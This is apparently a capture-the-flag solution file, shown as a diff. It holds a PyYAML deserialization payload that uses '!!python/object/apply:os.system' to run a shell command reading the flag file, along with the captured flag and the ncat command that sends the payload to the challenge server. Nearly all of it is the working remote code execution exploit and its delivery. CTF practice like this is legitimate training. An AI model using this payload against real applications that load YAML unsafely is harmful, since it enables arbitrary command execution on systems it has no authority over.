@@ -1,0 +1,5 @@
+yaml: !!python/object/apply:os.system ["cat fl4g.txt"]
+
+# ISICTF{my_f1r57_RC3_3xpl01t_1s_4w350m3}
+# cat flag.yaml | ncat challenges.isictf.live 1108
+# nc didnt work i had to use ncat  
